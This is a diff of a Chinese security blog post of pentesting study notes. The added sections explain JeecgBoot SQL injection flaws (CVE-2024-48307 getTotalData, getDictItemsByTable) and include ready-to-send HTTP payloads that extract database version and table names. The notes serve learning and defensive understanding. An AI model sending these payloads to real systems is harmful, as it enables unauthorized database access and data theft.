@@ -1,5 +1,5 @@
-<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"/><meta name="theme-color" content="#222"/><meta http-equiv="X-UA-COMPATIBLE" content="IE=edge,chrome=1"/><meta name="renderer" content="webkit"/><link rel="icon" type="image/ico" sizes="32x32" href="/assets/favicon.ico"/><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"/><link rel="alternate" href="/rss.xml" title="欢迎来到ZLARYY的个人博客，或许里面有什么好玩的东西~" type="application/rss+xml"><link rel="alternate" href="/atom.xml" title="欢迎来到ZLARYY的个人博客，或许里面有什么好玩的东西~" type="application/atom+xml"><link rel="alternate" type="application/json" title="欢迎来到ZLARYY的个人博客，或许里面有什么好玩的东西~" href="https://zlaryy.top/feed.json"/><link rel="preconnect" href="https://s4.zstatic.net"/><link rel="preconnect" href="https://at.alicdn.com"/><link rel="modulepreload" href="/js/siteInit.js"></link><link rel="modulepreload" href="/js/nyx-player-HIXTN7KD.js"></link><link rel="modulepreload" href="/js/copy-tex-4AIDXWNJ.js"></link><link rel="modulepreload" href="/js/post-MYXPIC3N.js"></link><link rel="modulepreload" href="/js/chunk-T54OBHW4.js"></link><link rel="modulepreload" href="/js/index.esm-22UB7CNZ.js"></link><link rel="modulepreload" href="/js/chunk-HJSTZ4VX.js"></link><link rel="modulepreload" href="/js/chunk-ALXQBZTY.js"></link><link rel="stylesheet" href="/css/siteInit.css" media="none" onload="this.media&#x3D;&#39;all&#39;"></link><link rel="preload" href="/assets/picture1.webp" as="image" fetchpriority="high"><link rel="preload" href="/assets/picture5.webp" as="image" fetchpriority="high"><link rel="preload" href="/assets/picture4.webp" as="image" fetchpriority="high"><link rel="preload" href="/assets/picture2.webp" as="image" fetchpriority="high"><link rel="preload" href="/assets/picture4.webp" as="image" fetchpriority="high"><link rel="preload" href="/assets/picture3.webp" as="image" fetchpriority="high"><meta name="keywords" content="Web安全"/><meta name="description" content="Web安全 / CTF / 个人学习笔记"/><link rel="canonical" href="https://zlaryy.top/2026/05/19/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9/"><link rel="stylesheet" href="/css/post.css?v=0.5.4"><link rel="stylesheet" href="/css/mermaid.css?v=0.5.4"><!-- 临时处理--><link rel="stylesheet" media="none" onload="this.media='all'" href="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.css"><title>常规外网打点</title><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css">
-<link rel="stylesheet" href="/css/custom.css"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="pagefind_mount"></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">常规外网打点</h1><div class="meta"><span class="item" title="创建时间：2026-05-19 21:00:00"><span class="icon"><i class="ic i-calendar"></i></span><span class="text">发表于</span><time itemprop="dateCreated datePublished" datetime="2026-05-19T21:00:00+08:00">2026-05-19</time></span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i></span><span class="text">本文字数</span><span>32k</span><span class="text">字</span></span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i></span><span class="text">阅读时长</span><span>29 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span><span class="line"></span><span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">ZLARYY</a></li></ul><ul class="right" id="rightNav"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div class="pjax" id="imgs"><ul><li class="item" style="background-image: url(&quot;/assets/picture1.webp&quot;);"></li><li class="item" style="background-image: url(&quot;/assets/picture5.webp&quot;);"></li><li class="item" style="background-image: url(&quot;/assets/picture4.webp&quot;);"></li><li class="item" style="background-image: url(&quot;/assets/picture2.webp&quot;);"></li><li class="item" style="background-image: url(&quot;/assets/picture4.webp&quot;);"></li><li class="item" style="background-image: url(&quot;/assets/picture3.webp&quot;);"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"></path></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"></use><use xlink:href="#gentle-wave" x="48" y="3"></use><use xlink:href="#gentle-wave" x="48" y="5"></use><use xlink:href="#gentle-wave" x="48" y="7"></use></g></svg></div><main><div class="inner"><div class="pjax" id="main"><div class="article wrap"><div class="breadcrumb" itemListElement itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i><span><a href="/">首页</a></span></div><article class="post block" itemscope="itemscope" itemtype="http://schema.org/Article" data-pagefind-body="data-pagefind-body" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://zlaryy.top/2026/05/19/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9/"/><span hidden="hidden" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="image" content="/assets/avertar.png"/><meta itemprop="name" content="ZLARYY"/><meta itemprop="description" content=", Web安全 / CTF / 个人学习笔记"/></span><span hidden="hidden" itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="欢迎来到ZLARYY的个人博客，或许里面有什么好玩的东西~"/></span><div class="body md" itemprop="articleBody"><h1 id="常规外网打点持续更新中"><a class="anchor" href="#常规外网打点持续更新中">#</a> 常规外网打点（持续更新中......）</h1>
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"/><meta name="theme-color" content="#222"/><meta http-equiv="X-UA-COMPATIBLE" content="IE=edge,chrome=1"/><meta name="renderer" content="webkit"/><link rel="icon" type="image/ico" sizes="32x32" href="/assets/favicon.ico"/><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"/><link rel="alternate" href="/rss.xml" title="欢迎来到ZLARYY的个人博客，或许里面有什么好玩的东西~" type="application/rss+xml"><link rel="alternate" href="/atom.xml" title="欢迎来到ZLARYY的个人博客，或许里面有什么好玩的东西~" type="application/atom+xml"><link rel="alternate" type="application/json" title="欢迎来到ZLARYY的个人博客，或许里面有什么好玩的东西~" href="https://zlaryy.top/feed.json"/><link rel="preconnect" href="https://s4.zstatic.net"/><link rel="preconnect" href="https://at.alicdn.com"/><link rel="modulepreload" href="/js/siteInit.js"></link><link rel="modulepreload" href="/js/nyx-player-HIXTN7KD.js"></link><link rel="modulepreload" href="/js/copy-tex-4AIDXWNJ.js"></link><link rel="modulepreload" href="/js/post-MYXPIC3N.js"></link><link rel="modulepreload" href="/js/chunk-T54OBHW4.js"></link><link rel="modulepreload" href="/js/index.esm-22UB7CNZ.js"></link><link rel="modulepreload" href="/js/chunk-HJSTZ4VX.js"></link><link rel="modulepreload" href="/js/chunk-ALXQBZTY.js"></link><link rel="stylesheet" href="/css/siteInit.css" media="none" onload="this.media&#x3D;&#39;all&#39;"></link><link rel="preload" href="/assets/picture1.webp" as="image" fetchpriority="high"><link rel="preload" href="/assets/picture4.webp" as="image" fetchpriority="high"><link rel="preload" href="/assets/picture2.webp" as="image" fetchpriority="high"><link rel="preload" href="/assets/picture5.webp" as="image" fetchpriority="high"><link rel="preload" href="/assets/picture5.webp" as="image" fetchpriority="high"><link rel="preload" href="/assets/picture2.webp" as="image" fetchpriority="high"><meta name="keywords" content="Web安全"/><meta name="description" content="Web安全 / CTF / 个人学习笔记"/><link rel="canonical" href="https://zlaryy.top/2026/05/19/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9/"><link rel="stylesheet" href="/css/post.css?v=0.5.4"><link rel="stylesheet" href="/css/mermaid.css?v=0.5.4"><!-- 临时处理--><link rel="stylesheet" media="none" onload="this.media='all'" href="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.css"><title>常规外网打点</title><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css">
+<link rel="stylesheet" href="/css/custom.css"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="pagefind_mount"></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">常规外网打点</h1><div class="meta"><span class="item" title="创建时间：2026-05-19 21:00:00"><span class="icon"><i class="ic i-calendar"></i></span><span class="text">发表于</span><time itemprop="dateCreated datePublished" datetime="2026-05-19T21:00:00+08:00">2026-05-19</time></span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i></span><span class="text">本文字数</span><span>52k</span><span class="text">字</span></span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i></span><span class="text">阅读时长</span><span>48 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span><span class="line"></span><span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">ZLARYY</a></li></ul><ul class="right" id="rightNav"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div class="pjax" id="imgs"><ul><li class="item" style="background-image: url(&quot;/assets/picture1.webp&quot;);"></li><li class="item" style="background-image: url(&quot;/assets/picture4.webp&quot;);"></li><li class="item" style="background-image: url(&quot;/assets/picture2.webp&quot;);"></li><li class="item" style="background-image: url(&quot;/assets/picture5.webp&quot;);"></li><li class="item" style="background-image: url(&quot;/assets/picture5.webp&quot;);"></li><li class="item" style="background-image: url(&quot;/assets/picture2.webp&quot;);"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"></path></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"></use><use xlink:href="#gentle-wave" x="48" y="3"></use><use xlink:href="#gentle-wave" x="48" y="5"></use><use xlink:href="#gentle-wave" x="48" y="7"></use></g></svg></div><main><div class="inner"><div class="pjax" id="main"><div class="article wrap"><div class="breadcrumb" itemListElement itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i><span><a href="/">首页</a></span></div><article class="post block" itemscope="itemscope" itemtype="http://schema.org/Article" data-pagefind-body="data-pagefind-body" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://zlaryy.top/2026/05/19/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9/"/><span hidden="hidden" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="image" content="/assets/avertar.png"/><meta itemprop="name" content="ZLARYY"/><meta itemprop="description" content=", Web安全 / CTF / 个人学习笔记"/></span><span hidden="hidden" itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="欢迎来到ZLARYY的个人博客，或许里面有什么好玩的东西~"/></span><div class="body md" itemprop="articleBody"><h1 id="常规外网打点持续更新中"><a class="anchor" href="#常规外网打点持续更新中">#</a> 常规外网打点（持续更新中......）</h1>
 <h1 id="spring-boot"><a class="anchor" href="#spring-boot">#</a> spring-boot</h1>
 <h2 id="actuator泄露"><a class="anchor" href="#actuator泄露">#</a> actuator泄露</h2>
 <p>参考：<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/407651.html">可造成敏感信息泄露！Spring Boot Actuator信息泄露漏洞三种利用方式总结 - FreeBuf网络安全行业门户</a></p>
@@ -608,7 +608,527 @@ http://127.0.0.1:8080/example/HelloWorld!%&#123;#req=#context.get('co'm.open'sym
 <pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>SELECT $&#123;textColumn&#125; AS text, $&#123;codeColumn&#125; AS value FROM $&#123;tableName&#125;</span></span></code></pre>
 <pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># payload</span></span>
 <span class="line"><span>/jeecg-boot/sys/dict/queryTableData?pageSize=100&#x26;table=information_schema.tables&#x26;text=table_name&#x26;code=TABLE_SCHEMA</span></span></code></pre>
-</div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i></span><span class="text">更新于 </span><time title="修改时间：2026-06-19 23:05:02" itemprop="dateModified" datetime="2026-06-19T23:05:02+08:00">2026-06-19</time></span></div><div id="copyright"><ul><li class="author"><strong>本文作者：</strong>ZLARYY<i class="ic i-at"><em>@</em></i>欢迎来到ZLARYY的个人博客，或许里面有什么好玩的东西~</li><li class="link"><strong>本文链接：</strong><a href="https://zlaryy.top/2026/05/19/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9/" title="常规外网打点">https://zlaryy.top/2026/05/19/常规外网打点/</a></li><li class="license"><strong>版权声明：</strong>本站所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2026/04/23/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" rel="prev" itemprop="url" data-background-image="&#x2F;assets&#x2F;picture3.webp" title="信息搜集"><span class="type">上一篇</span><h3>信息搜集</h3></a></div><div class="item right"><a href="/2026/05/29/%E5%85%B6%E4%BB%96%E7%B3%BB%E7%BB%9F%E5%BA%93%E7%B1%BB%E5%9E%8B%E4%B8%8B%E7%9A%84SQL%E6%B3%A8%E5%85%A5/" rel="next" itemprop="url" data-background-image="&#x2F;assets&#x2F;picture3.webp" title="其他系统库类型下的SQL注入"><span class="type">下一篇</span><h3>其他系统库类型下的SQL注入</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD"><span class="toc-number">1.</span> <span class="toc-text"> 常规外网打点（持续更新中......）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#spring-boot"><span class="toc-number">2.</span> <span class="toc-text"> spring-boot</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#actuator%E6%B3%84%E9%9C%B2"><span class="toc-number">2.1.</span> <span class="toc-text"> actuator泄露</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1x%E7%89%88%E6%9C%AC"><span class="toc-number">2.1.1.</span> <span class="toc-text"> 1.x版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2x%E7%89%88%E6%9C%AC"><span class="toc-number">2.1.2.</span> <span class="toc-text"> 2.x版本</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#heapdump"><span class="toc-number">2.1.2.1.</span> <span class="toc-text"> heapdump</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#jolokia"><span class="toc-number">2.1.2.2.</span> <span class="toc-text"> jolokia</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87waf%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9B%B8%E5%85%B3%E6%96%B9%E6%B3%95"><span class="toc-number">2.1.3.</span> <span class="toc-text"> 绕过waf的一些相关方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B"><span class="toc-number">2.2.</span> <span class="toc-text"> 实例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#vps"><span class="toc-number">2.2.1.</span> <span class="toc-text"> VPS</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#struts"><span class="toc-number">3.</span> <span class="toc-text"> struts</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ognl"><span class="toc-number">3.1.</span> <span class="toc-text"> OGNL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#s2-001cve-2007-4556"><span class="toc-number">3.2.</span> <span class="toc-text"> S2-001（CVE-2007-4556）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#s2-003"><span class="toc-number">3.3.</span> <span class="toc-text"> S2-003</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#s2-005cve-2010-1870"><span class="toc-number">3.4.</span> <span class="toc-text"> S2-005（CVE-2010-1870）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#s2-007"><span class="toc-number">3.5.</span> <span class="toc-text"> S2-007</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#s2-008cve-2012-0391"><span class="toc-number">3.6.</span> <span class="toc-text"> S2-008（CVE-2012-0391）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#s2-009cve-2011-3923"><span class="toc-number">3.7.</span> <span class="toc-text"> S2-009（CVE-2011-3923）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#s2-012"><span class="toc-number">3.8.</span> <span class="toc-text"> S2-012</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#s2-013s2-014"><span class="toc-number">3.9.</span> <span class="toc-text"> S2-013&#x2F;S2-014</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#s2-015"><span class="toc-number">3.10.</span> <span class="toc-text"> S2-015</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#s2-016"><span class="toc-number">3.11.</span> <span class="toc-text"> S2-016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#s2-019"><span class="toc-number">3.12.</span> <span class="toc-text"> S2-019</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#s2-032cve-2016-3081"><span class="toc-number">3.13.</span> <span class="toc-text"> S2-032（CVE-2016-3081）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#jeecg-boot"><span class="toc-number">4.</span> <span class="toc-text"> jeecg-boot</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.1.</span> <span class="toc-text"> 常见弱口令漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jeecgboot-passwordchange%E6%8E%A5%E5%8F%A3%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE"><span class="toc-number">4.2.</span> <span class="toc-text"> JeecgBoot passwordChange接口任意用户密码重置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jeecg-boot-checkonlyuser%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.3.</span> <span class="toc-text"> jeecg-boot-checkOnlyUser信息泄露漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jeecg-boot-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.4.</span> <span class="toc-text"> jeecg-boot-目录遍历漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jeecg-boot-344-sysdictquerytabledata-sql%E6%B3%A8%E5%85%A5"><span class="toc-number">4.5.</span> <span class="toc-text"> Jeecg-boot 3.4.4 &#x2F;sys&#x2F;dict&#x2F;queryTableData SQL注入</span></a></li></ol></li></ol></div><div class="related panel pjax" data-title="系列文章"></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><img class="image" loading="lazy" decoding="async" itemprop="image" alt="ZLARYY" src="/assets/avertar.png"/><p class="name" itemprop="name">ZLARYY</p><div class="description" itemprop="description">Web安全 / CTF / 个人学习笔记</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">16</span><span class="name">文章</span></a></div></nav><div class="social"><a target="_blank" rel="noopener" href="https://github.com/ZLARYY123" class="item github" title="https:&#x2F;&#x2F;github.com&#x2F;ZLARYY123"><i class="ic i-github"></i></a></div><div class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>友链</a></li><li class="item"><a href="/essay/" rel="section"><i class="ic i-calendar"></i>essay</a></li></div></div></div></div><ul id="quick"><li class="prev pjax"><a href="/2026/05/29/%E5%85%B6%E4%BB%96%E7%B3%BB%E7%BB%9F%E5%BA%93%E7%B1%BB%E5%9E%8B%E4%B8%8B%E7%9A%84SQL%E6%B3%A8%E5%85%A5/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/2026/04/23/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div><div id="player"></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"></div><span><a href="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">php反序列化</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/06/19/Linux%E6%8F%90%E6%9D%83/">Linux提权</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/02/12/SSRF/">SSRF</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/04/11/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">SSTI模板注入</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/02/28/RCE/">RCE</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/06/18/SQL%E6%8F%90%E6%9D%83/">SQL提权</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/05/19/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9/">常规外网打点</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/03/10/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/04/23/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">信息搜集</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/03/27/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">沙箱逃逸</a></span></li></ul></div><div class="rpost pjax"><h2>最新评论</h2></div></div><div class="status"><div class="copyright">&copy; 2022 -<span itemprop="copyrightYear">2026</span><span class="with-love"><i class="ic i-sakura rotate"></i></span><span class="author" itemprop="copyrightHolder">ZLARYY @ ZLARYY</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i></span><span title="站点总字数">364k 字</span><span class="post-meta-divider"> | </span><span class="post-meta-item-icon"><i class="ic i-coffee"></i></span><span title="站点阅读时长">5:31</span></div><div class="powered-by">基于 <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & Theme.<a target="_blank" rel="noopener" href="https://github.com/theme-shoka-x/hexo-theme-shokaX/">ShokaX</a></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL = {
+<h2 id="jeecgboot-onldragdatasetheadgettotaldata-sql注入"><a class="anchor" href="#jeecgboot-onldragdatasetheadgettotaldata-sql注入">#</a> JeecgBoot onlDragDatasetHead/getTotalData SQL注入</h2>
+<p>这是<code>JeecgBoot/JimuReport</code>仪表盘模块中的一个未授权SQL注入，CVE编号为<code>CVE-2024-48307</code>，<code>JeecgBoot v3.7.1</code>的<code>/onlDragDatabaseHead/getTotalData</code>组件存在SQL注入，实际常见路径是带项目上下文和<code>drag</code>前缀的<code>/jeecg-boot/drag/onlDragDatabaseHead/getTotalData</code></p>
+<p><code>onlDragDatabaseHead/getTotalData</code>这个接口属于<code>JeecgBoot</code>集成的<code>JimuReport/JimuBI</code>仪表盘大屏模块，它支持报表、仪表盘、大屏设计，用户可以通过拖拽组件完成数据展示，相关权限也说明了<code>drag:design:getTotalData</code>，说明这个接口本来就是给仪表盘获取Online表单展示数据用的，其正常业务逻辑大概是<strong>前端告诉后端要查询的tableName、filedName、filter和用什么维度、指标、统计字段</strong></p>
+<p>利用点主要围绕JSON请求体里的参数：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>tableName</span></span>
+<span class="line"><span>config.name[].fieldName</span></span>
+<span class="line"><span>config.value[].fieldName</span></span>
+<span class="line"><span>condition / filter</span></span></code></pre>
+<p>如果这些参数被后端直接拼接<code>select 字段 from 表名 where 条件</code>那么就会造成SQL注入</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># payload</span></span>
+<span class="line"><span>POST /jeecg-boot/drag/onlDragDatasetHead/getTotalData HTTP/2</span></span>
+<span class="line"><span>Host: </span></span>
+<span class="line"><span>Accept-Encoding: gzip, deflate</span></span>
+<span class="line"><span>Accept: */*</span></span>
+<span class="line"><span>Accept-Language: en-US;q=0.9,en;q=0.8</span></span>
+<span class="line"><span>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36</span></span>
+<span class="line"><span>Content-Type: application/json</span></span>
+<span class="line"><span>Content-Length: 281</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>&#123;"tableName":"sys_user","compName":"test","condition":&#123;"filter":&#123;&#125;&#125;,"config":&#123;"assistValue":[],"assistType":[],"name":[&#123;"fieldName":"concat(0x7e,version(),0x7e)","fieldType":"string"&#125;,&#123;"fieldName":"id","fieldType":"string"&#125;],"value":[&#123;"fieldName":"id","fieldType":"1"&#125;],"type":[]&#125;&#125;</span></span></code></pre>
+<h2 id="jeecg-boot-getdictitemsbytable-sql注入漏洞"><a class="anchor" href="#jeecg-boot-getdictitemsbytable-sql注入漏洞">#</a> jeecg-boot-getDictItemsByTable SQL注入漏洞</h2>
+<p><code>jeecg-boot-getDictItemsByTable</code>SQL注入漏洞本质上是<code>JeecgBoot</code>早期“动态字典查询接口”把用户传入的表名、显示字段、值字段直接拼接进SQL，其常见的漏洞接口形式为：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>/jeecg-boot/sys/ng-alain/getDictItemsByTable/&#123;table&#125;/&#123;key&#125;/&#123;value&#125;</span></span></code></pre>
+<p>这个接口原本是给前端组件加载“字典项”用的，比如需要从某张表里面查数据：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>表名：sys_depart</span></span>
+<span class="line"><span>显示字段：depart_name</span></span>
+<span class="line"><span>值字段：id</span></span></code></pre>
+<p>后端就会查询类似：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>select depart_name as label, id as value from sys_depart</span></span></code></pre>
+<p>最终获得前端指定表、指定字段里取得的字典数据</p>
+<p>但是在后端里面，<code>table</code>、<code>key</code>、<code>value</code>并不是作为普通值传入SQL，而是被原样替换到SQL结构里面，用的还是MyBatis的<code>$&#123;&#125;</code>字符串拼接，而不是安全参数绑定</p>
